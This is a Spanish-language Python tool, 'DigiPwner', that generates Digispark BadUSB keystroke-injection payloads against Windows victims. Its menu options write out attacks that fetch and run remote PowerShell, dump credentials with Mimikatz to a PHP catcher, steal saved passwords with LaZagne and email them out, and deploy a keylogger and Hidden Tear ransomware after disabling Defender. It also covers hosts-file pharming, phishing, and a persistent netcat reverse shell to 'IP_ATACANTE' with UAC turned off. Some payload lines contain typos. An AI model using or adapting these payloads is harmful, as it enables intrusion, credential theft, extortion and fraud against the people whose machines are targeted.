#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
print("""    
  _____  _       _ _____                           
 |  __ \(_)     (_)  __ \                          
 | |  | |_  __ _ _| |__) |_      ___ __   ___ _ __ 
 | |  | | |/ _` | |  ___/\ \ /\ / / '_ \ / _ \ '__|
 | |__| | | (_| | | |     \ V  V /| | | |  __/ |   
 |_____/|_|\__, |_|_|      \_/\_/ |_| |_|\___|_|   
            __/ |                                  
           |___/                                   
.........................................................

     [1] Obtener reverse shell con Meterpreter 
     [2] Apagar el equipo victima
     [3] Extraer contraseñas de los usuarios de Windows
     [4] Cambiar contraseña del administrador de Windows
     [5] Extraer todas las contraseñas guardadas(W8,W10)
     [6] Infectar victima con Keylogger (RCE)
     [7] Secuestrar computadora victima con Ransomware 
     [8] Hackear Facebook y otros servicios (Phi/Pha)
     [9] Crear Backdoor persistente en el equipo victima         
""")
eleccion = int(eval(input("DigiPwner>> ")))
#_____________________________________________________________________________
#_____________________________________________________________________________
if eleccion == 1:

  print("""
PARA OBTENER UNA SHELL DE METERPRETER ES NECESARIO HABER SUBIDO
EL EJECUTABLE PREVIAMENTE A UN SERVIDOR REMOTO. 
""")
  import re 
  print()
  servidor = input("INGRESA LA URL DE TU SERVIDOR REMOTO: >> ")
  servidor_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, list(servidor_reem.keys()))))  
  new_servidor = regex.sub(lambda x: str(servidor_reem[x.string[x.start() :x.end()]]), servidor)
  print() 
  one_cade1 = """DigiKeyboard.println("powershell Set/MpPreference /DisableRealtimeMonitoring $true ^^ powershell /nop /c @iex*New/Object Net.WebClient(.DownloadString*-"""
  one_cade2 = (new_servidor)
  one_cade3 = """-(@");"""
  
  print("""
#include "DigiKeyboard.h"

void setup() {
  // 
}

void loop() {
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Start/Process cmd /verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
""")
  print()
  one_concaty ="  {0}{1}{2}"
  print(one_concaty.format(one_cade1, one_cade2, one_cade3))
  print("""
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  }
  """)

  
#_______________________________________________________________________________
#_______________________________________________________________________________
elif eleccion == 2:
  tiempo = int(eval(input("En cuantos segundos deseas apagar la computadora victima?(Ej:1)>> ")))
  
  print("""
#include "DigiKeyboard.h"

void setup() {
  // 
}


void loop() {
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("shutdown /s /t""", end=' ');
  print((tiempo), end=' ')
  print("""");""")

  print("""    
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  }
  """)
#________________________________________________________________________
#________________________________________________________________________
elif eleccion == 3:
  print("""
ESTE ATAQUE SE LLEVARÁ A CABO INVOCANDO MIMIKATZ DESDE UN SERVIDOR REMOTO
CON LA MERA FINALIDAD DE QUE NO TOQUE EL DISCO DURO DEL ORDENADOR OBJETIVO, SINO QUE EXTRAIGA 
LAS CONTRASEÑAS DE LOS USUARIOS DE WINDOWS VOLCANDO EL PROCESO LSASS.EXE DESDE LA MEMORIA RAM,
EVITANDO INYECTAR LA LIBRERIA SEKURLSA.DLL EN EL PROCESO DE LSASS. DE ESTA MANERA SE ELIMINA LA 
POSIBILIDAD DE QUE MIMIKATZ SEA DETECTADO POR LOS ANTIVIRUS, PUES NO HAY NECESIDAD DE INYECTAR 
NADA EN EL EQUIPO VICTIMA Y NO SE DEBERÁ LIDIAR CON TÉCNICAS DE EVASIÓN DE MALWARE.

  ACCEDE A: 
  https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1
  COPIA LAS 2752 LINEAS DE CÓDIGO, GUARDA EL ARCHIVO CON LA EXTENSION .ps1 (EJ: mimikatz.ps1)
  Y SUBE EL ARCHIVO A TU SERVIDOR REMOTO.

  DESPUÉS COPIA EL SIGUIENTE CÓDIGO:

  <?php
  $file = $_SERVER['REMOTE_ADDR'] . "_" . date("Y-m-d_H-i-s") . ".creds";
  file_put_contents($file, file_get_contents("php://input"));
  ?>

  GUARDA EL ARCHIVO CON LA EXTENSIÓN .php (EJ: captura.php) Y SUBE EL ARCHIVO A LA MISMA
  RUTA QUE EL ANTERIOR.

  Y LISTO!! AL COMPLETAR EL ATAQUE SE GENERARÁ UN NUEVO ARCHIVO EN ESTA MISMA RUTA, EN EL
  CUAL ESTARÁN LAS CONTRASEÑAS EN TEXTO PLANO DE LOS USUARIOS DEL EQUIPO VICTIMA""")

  import re    
  print() 
  remote_serv = input("Ingresa la ruta del archivo .ps1 (Ej: http://server.com/tar/mimikatz.ps1>>")
  reemply = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, list(reemply.keys()))))  
  nuev_cad = regex.sub(lambda x: str(reemply[x.string[x.start() :x.end()]]), remote_serv)
  print()
#__________________________________________________________________
  arch_php = input("Ingresa la ruta del archivo .php (Ej: http://server.com/tar/captura.php)>>")
  reemplyz = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, list(reemplyz.keys()))))  
  archy_php = regex.sub(lambda x: str(reemplyz[x.string[x.start() :x.end()]]), arch_php)
#_______________________________________________________
  caden1 = """  DigiKeyboard.println("powershell /NoP /NonI /W Hidden /Exec Bypass /c @IEX*New/Object Net.WebClient(.DownloadString*-"""
  caden2 = (nuev_cad)
  caden3 = """-(<$o)Invoke/Mimikatz /DumpCreds<*New/Object Net.WebClient(.UploadString*-"""
  caden4 = (archy_php)
  caden5 = """-,$o(@^exit");"""
  
  print("""
#include "DigiKeyboard.h"

void setup() {
}


void loop() {
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Start/Process cmd /Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);""")

  concat ="{0}{1}{2}{3}{4}"
  print(concat.format(caden1, caden2, caden3, caden4, caden5))
  print("""

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
    } """)
#_____________________________________________________________
elif eleccion == 4:
  import re
  print() 
  user_name = input("INGRESA EL NOMBRE DE USUARIO>> ")
  reemplx = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, list(reemplx.keys()))))  
  new_cad = regex.sub(lambda x: str(reemplx[x.string[x.start() :x.end()]]), user_name)
  print() 

  user_pass = input("INGRESA LA CONTRASEÑA QUE DESEAS ASIGNAR>> ")
  reemplxa = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, list(reemplxa.keys()))))  
  new_userpass = regex.sub(lambda x: str(reemplxa[x.string[x.start() :x.end()]]), user_pass)
  print()

  cade1 = 'DigiKeyboard.println("'
  cade2 = (new_userpass)
  cade3 = """");"""
  
  print("""
#include "DigiKeyboard.h"

void setup() {
}


void loop() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Start/Process cmd /Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("net user""", end=' ')

  print((new_cad), end=' ')

  print("""}");""")
  print()
  print("""      DigiKeyboard.sendKeyStroke(KEY_ENTER);""")
  print()
  concaty ="      {0}{1}{2}"
  print(concaty.format(cade1, cade2, cade3))
  print()
  print("""      DigiKeyboard.sendKeyStroke(KEY_ENTER);

      DigiKeyboard.delay(300);""")
  print()
  print(concaty.format(cade1, cade2, cade3))
  print()
  print("""      DigiKeyboard.sendKeyStroke(KEY_ENTER);

      DigiKeyboard.delay(100);

      DigiKeyboard.println("exit");

      DigiKeyboard.sendKeyStroke(KEY_ENTER);

      }""")
#________________________________________________________________
elif eleccion == 5:
  print("""
ESTE ATAQUE EXTRAE TODAS LAS CONTRASEÑAS GUARDADAS EN EL EQUIPO VICTIMA CON AYUDA DE LAZAGNE...
LAZAGNE SE ENCARGARÁ DE EXTRAER LAS CONTRASEÑAS DE LOS SIGUIENTES SERVICIOS:

  FACEBOOK   TWITTER   WiFi_Networks   PUTTY     CHROME   PIDGIN   OpenSSH   FILEZILLA 

  FIREFOX    OPERA     WINSCP	       OUTLOOK   SKYPE    FIREFOX  IE        APACHE

  CoreFTP    JITSI     SQLdeveloper    THUNDERBIRD    

  1.- DESCARGA LAZAGNE.EXE DESDE LA URL SIGUIENTE: https://github.com/AlessandroZ/LaZagne/releases/

  2.- CREA UN ARCHIVO LLAMADO exec.ps1 (GUARDALO CON LA EXTENSION .ps1) CON EL SIGUIENTE CONTENIDO:

  3./lazagne.exe all -v >> passwords.txt; powershell -ExecutionPolicy Bypass ./power_mail.ps1; del lazagne.exe; del power_mail.ps1; del passwords.txt; del exec.ps1

  - CREA UN ARCHIVO LLAMADO power_mail.ps1 (GUARDALO CON LA EXTENSION .ps1) CON EL SIGUIENTE CONTENIDO:

  $SMTPServer = 'smtp.gmail.com'
  $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
  $SMTPInfo.EnableSsl = $true
  $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('tucorreo@gmail.com', 'TuPassword');
  $ReportEmail = New-Object System.Net.Mail.MailMessage
  $ReportEmail.From = 'tucorreo@gmail.com' 
  $ReportEmail.To.Add('tucorreo@gmail.com')
  $ReportEmail.Subject = 'REPORTE'
  $ReportEmail.Body = 'Reporte de passwords'
  $ReportEmail.Attachments.Add('c:\windows\system32\passwords.txt')
  $SMTPInfo.Send($ReportEmail)

  *** LOS TRES ARCHIVOS ANTERIORES DEBEN ESTAR EN EL MISMO DIRECTORIO DE TU SERVIDOR REMOTO *** """)
  import re
  print() 
  laza = input("INGRESA LA RUTA DE lazagne.exe: >> ")
  laza_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, list(laza_reem.keys()))))  
  new_laza = regex.sub(lambda x: str(laza_reem[x.string[x.start() :x.end()]]), laza)
  print() 

  arch_exec = input("INGRESA LA RUTA DE exec.ps1: >> ")
  exec_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, list(exec_reem.keys()))))  
  new_exec = regex.sub(lambda x: str(exec_reem[x.string[x.start() :x.end()]]), arch_exec)
  print()

  mail = input("INGRESA LA RUTA DE power_mail.ps1: >> ")
  mail_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, list(mail_reem.keys()))))  
  new_mail = regex.sub(lambda x: str(mail_reem[x.string[x.start() :x.end()]]), mail)

  five_start = """DigiKeyboard.println("$down ) New/Object System.Net.WebClient< $url ) -"""
  five_cade1 = (new_laza) 
  five_cade2 = """-< $file ) -lazagne.exe-< $down.DownloadFile*$url,$file(< $down ) New/Object System.Net.WebClient< $url ) -"""
  five_cade3 = (new_mail)
  five_cade4 = """-< $file ) -power?mail.ps1-< $down.DownloadFile*$url,$file(< $down ) New/Object System.Net.WebClient< $url ) -"""
  five_cade5 = (new_exec)
  five_cade6 = """-< $file ) -exec.ps1-< $down.DownloadFile*$url,$file(");"""
  
  print("""
#include "DigiKeyboard.h"
#define KEY_ESC     41

void setup() {
}


void loop() {
  DigiKeyboard.sendKeyStroke(KEY_ESC, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT, MOD_SHIFT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);""")
  print()
  five_concaty ="      {0}{1}{2}{3}{4}{5}{6}"
  print(five_concaty.format(five_start, five_cade1, five_cade2, five_cade3, five_cade4, five_cade5, five_cade6))
  print("""

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.elay(9000);
  DigiKeyboard.println("powershell /ExecutionPolicy Bypass .&exec.ps1< exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  }""")
#__________________________________________
elif eleccion == 6:
  print("""
PARA LLEVAR A CABO ESTE ATAQUE, ES NECESARIO GENERAR EL KEYLOGGER EN LA HERRAMIENTA BEELOGGER,
GRACIAS A ESTA HERRAMIENTA LAS PULSACIONES DE TECLAS DE LA VICTIMA SERÁN ENVIADAS A TU CORREO 
DE GMAIL CADA 2 MINUTOS.

** EL USUARIO PUEDE SERVIRSE DE ESTE MISMO MÓDULO PARA EJECUTAR CUALQUIER MALWARE REMOTO **

  1.- EJECUTA EN UNA TERMINAL: git clone https://github.com/4w4k3/BeeLogger.git

  2.- EJECUTA EL FICHERO LLAMADO install.sh: ./install.sh

  3.- EJECUTA EL FICHERO LLAMADO bee.py: ./bee.py

  4.- Y SIGUE LOS PASOS PARA GENERAR TU KEYLOGGER PERSONALIZADO

  ** ACTIVA EL ACCESO A LAS APLICACIONES MENOS SEGURAS EN TU CUENTA DE GMAIL EN:
  https://myaccount.google.com/lesssecureapps

  ** UNA VEZ QUE OBTENGAS EL EJECUTABLE DE TU KEYLOGGER, SUBELO A TU SERVIDOR REMOTO **""")
  print()
  import re
  six_serv = input ("INGRESA LA RUTA DE TU KEYLOGGER:>> ")
  six_serv_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, list(six_serv_reem.keys()))))  
  new_six_serv = regex.sub(lambda x: str(six_serv_reem[x.string[x.start() :x.end()]]), six_serv)
  print() 

  six_name = input ("INGRESA EL NOMBRE DE TU KEYLOGGER:>> ")
  six_name_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, list(six_name_reem.keys()))))  
  new_six_name = regex.sub(lambda x: str(six_name_reem[x.string[x.start() :x.end()]]), six_name)
  print() 

  six_cade1 = """DigiKeyboard.println("$down ) New/Object System.Net.WebClient< $url ) -"""
  six_cade2 = (new_six_serv)
  six_cade3 = """-< $file ) -"""
  six_cade4 = (new_six_name) 
  six_cade5 = """-< $down.DownloadFile*$url,$file(< $exec ) New/Object /com shell.application< $exec.shellexecute*$file(< exit<");"""
  
  print("""
#include "DigiKeyboard.h"
void setup() {
}


void loop() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Start/Process cmd /Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000); """)
  print()
  six_concaty ="      {0}{1}{2}{3}{4}"
  print(six_concaty.format(six_cade1, six_cade2, six_cade3, six_cade4, six_cade5))
  print("""

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

    }""")
#________________________________________________________
elif eleccion == 7:
  print("""
ESTE ATAQUE SE LLEVARÁ A CABO UTILIZANDO EL RANSOMWARE HIDDEN TEAR, DESACTIVANDO WINDOWS DEFENDER
Y EJECUTANDO EL RANSOMWARE DESDE UN SERVIDOR REMOTO.

** EL USUARIO PUEDE SERVIRSE DE ESTE MISMO MÓDULO PARA EJECUTAR CUALQUIER MALWARE QUE NECESITE
DESACTIVAR EL ANTIVIRUS ANTES DE SU EJECUCIÓN **

1.- DESCARGA HIDDEN TEAR EJECUTANDO EN UNA CONSOLA: 
    git clone https://github.com/goliate/hidden-tear.git

2.- DESCARGA MONODEVELOPER: sudo apt-get install monodevelop    

3.- ABRE EL ARCHIVO hidden-tear.sln Y MODIFICA LO NECESARIO PARA EL BUEN FUNCIONAMIENTO DEL RANSOMWARE 
    RUTA: --->   hidden-tear/hidden-tear/hidden-tear.sln

4.- COMPILA EL RANSOMWARE Y SUBELO A TU SERVIDOR REMOTO

5.- CREA UN ARCHIVO PHP, GUARDALO CON EL NOMBRE write.php Y SUBELO A TU SERVIDOR REMOTO 
    CON EL SIGUIENTE CONTENIDO: 

    <?php
    $archivo = fopen("out.txt", "w") or die("No se puede abrir el archivo");
    $txt = $_GET["info"];
    fwrite($archivo, $txt);
    fclose($archivo);
    ?>""")
  print()
  import re
  seven_serv = input("INGRESA LA RUTA DE TU RANSOMWARE:>> ")
  seven_serv_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, list(seven_serv_reem.keys()))))  
  new_seven_serv = regex.sub(lambda x: str(seven_serv_reem[x.string[x.start() :x.end()]]), seven_serv)
  print() 

  seven_name = input ("INGRESA EL NOMBRE DE TU RANSOMWARE:>> ")
  seven_name_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, list(seven_name_reem.keys()))))  
  new_seven_name = regex.sub(lambda x: str(seven_name_reem[x.string[x.start() :x.end()]]), seven_name)
  print()

  seven_cade1 = """DigiKeyboard.println(F("Set/MpPreference /DisableRealtimeMonitoring $true < $down ) New/Object System.Net.WebClient< $url ) -"""
  seven_cade2 = (new_seven_serv)
  seven_cade3 = """-< $file ) -"""
  seven_cade4 = (new_seven_name) 
  seven_cade5 = """-< $down.DownloadFile*$url,$file(< $exec ) New/Object /com shell.application< $exec.shellexecute*$file(< exit<"));"""
  
  print("""
#include "DigiKeyboard.h"
void setup() {
}


void loop() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Start/Process cmd /Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);""")
  print()
  seven_concaty ="  {0}{1}{2}{3}{4}"
  print(seven_concaty.format(seven_cade1, seven_cade2, seven_cade3, seven_cade4, seven_cade5))
  print("""
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  } """)

#___________________________________________________
elif eleccion == 8:
  print("""
1)PHARMING
2)PHISHING""")
  subelection = int(eval(input("-------------------->> ")))
  if subelection == 1:
    print("""
ESTE ATAQUE SE LLEVARÁ A CABO MEDIANTE PHARMING LOCAL, MODIFICANDO EL ARCHIVO HOSTS.

** EL ATAQUE ESTA PREPARADO PARA FUNCIONAR BAJO CHROME Y EJECUTAR EL MISMO PARA IGNORAR
LOS ERRORES DE CERTIFICADO ** """)
    print()
    import re
    oct_serv = input("INGRESA LA RUTA DE TU ARCHIVO HOSTS:>> ")
    oct_serv_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
    regex = re.compile("(%s)" % "|".join(map(re.escape, list(oct_serv_reem.keys()))))  
    new_oct_serv = regex.sub(lambda x: str(oct_serv_reem[x.string[x.start() :x.end()]]), oct_serv)
    print() 

    oct_page = input ("INGRESA LA URL DEL OBJETIVO (sin http):>> ")
    print()

    oct_cade1 = """DigiKeyboard.println("$down ) New/Object System.Net.WebClient< $url ) -"""
    oct_cade2 = (new_oct_serv)
    oct_cade3 = """-< $file ) -hosts-< $down.DownloadFile*$url,$file(");"""
    
    print("""
#include "DigiKeyboard.h"
#define KEY_TAB     43
void setup() {
}


void loop() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Start/Process cmd /Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000); 
  DigiKeyboard.println("cd drivers");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("cd etc");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("del hosts");
  DigiKeyboard.sendKetStroke(KEY_ENTER);
  DigiKeyboard.println("cd..");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("cd..");
  DigiKeyboard.(KEY_ENTER);""")
    print()
    oct_concaty ="  {0}{1}{2}"
    print(oct_concaty.format(oct_cade1, oct_cade2, oct_cade3))
    print("""
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.println("move hosts drivers");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("cd drivers");
  DigiKeyboard.sendKeyStroke(KEY_RETUR);
  DigiKeyboard.println("move hosts etc");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  DigiKeyboard.println("chrome.exe""", end=' ')
    print((oct_page), end=' ') 
    print("""//ignore/certificate/errors");""")

    print()

    print("""DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
}""")
  elif subelection == 2:
    print("""
ESTE ATAQUE DE PHISHING ESTA PREPARADO PARA FUNCIONAR BAJO CHROME.

** PERO EL USUARIO PUEDE MODIFICAR EL CÒDIGO PARA OTROS NAVEGADORES ** """)
    print()
    import re
    ten_serv = input("INGRESA TU SITIO DE PHISHING:>> ")
    ten_serv_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
    regex = re.compile("(%s)" % "|".join(map(re.escape, list(ten_serv_reem.keys()))))  
    new_ten_serv = regex.sub(lambda x: str(ten_serv_reem[x.string[x.start() :x.end()]]), ten_serv)
    print() 

    ten_real = input("INGRESA LA URL DEL SITIO REAL:>> ")
    ten_real_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
    regex = re.compile("(%s)" % "|".join(map(re.escape, list(ten_real_reem.keys()))))  
    new_ten_real = regex.sub(lambda x: str(ten_real_reem[x.string[x.start() :x.end()]]), ten_real)
    print() 

    ten_cade1 = (new_ten_serv)
    ten_cade2 = """");"""
    ten_cade3 = '''DigiKeyboard.println("'''
    ten_cade4 = (new_ten_real)
    
    print("""
  #include "DigiKeyboard.h"
  #define KEY_TAB     43
  void setup() {
  }

  void loop() {
  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT);
  DigiKeyboard.sendKeyStroke('r');
  DigiKeyboard.delay(500);
  DigiKeyboard.println("chrome.exe""", end=' ')
    ten_concaty ="{0}{1}"
    print(ten_concaty.format(ten_cade1, ten_cade2))
    print("""
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT);
  DigiKeyboard.sendKeyStroke('l');

  DigiKeyboard.delay(800);""")
    print()
    ten_secconcaty ="  {0}{1}{2}"
    print(ten_secconcaty.format(ten_cade3, ten_cade4, ten_cade2))
    print("""

  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT);
  DigiKeyboard.sendKeyStroke('f');
  DigiKeyboard.println("a");
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
}""")
#__________________________________________
elif eleccion == 9:
  print("""
PARA LLEVAR A CABO ESTE ATAQUE, ES NECESARIO SUBIR NC Y LOS SIGUIENTES ARCHIVOS A UN SERVIDOR REMOTO
____________________________

ejecutor.vbs:

set objshell = createobject("wscript.shell")
objshell.run "c:\windows\system32\orden.bat",vbhide
____________________________

persist.bat:

reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "tskname" /t REG_SZ /d "C:\windows\system32\ejecutor.vbs" /f 

____________________________

orden.bat:

nc -d -e cmd.exe IP_ATACANTE PUERTO

____________________________ 

des_uac.bat

reg.exe add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

____________________________ """)


  print()
  import re 
  ejec = input("INGRESA LA RUTA DE ejecutor.vbs: >> ")
